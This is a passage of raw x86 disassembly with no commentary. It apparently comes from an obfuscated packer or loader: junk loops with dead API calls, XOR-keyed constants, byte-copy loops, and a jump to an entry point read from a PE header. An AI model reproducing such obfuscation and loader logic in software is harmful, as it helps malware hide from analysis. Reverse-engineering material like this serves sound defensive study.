  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423992
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c66
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e82
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c66
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42385f
  41bc20:	push   0x423893
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e82,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c66
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238de
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423893
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423956
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c66
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421aea,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d3e,eax
  41c15b:	mov    eax,ds:0x421aea
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c66
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d3e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421aea
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c66
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c66
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c66
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cea,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421ce2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c66
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
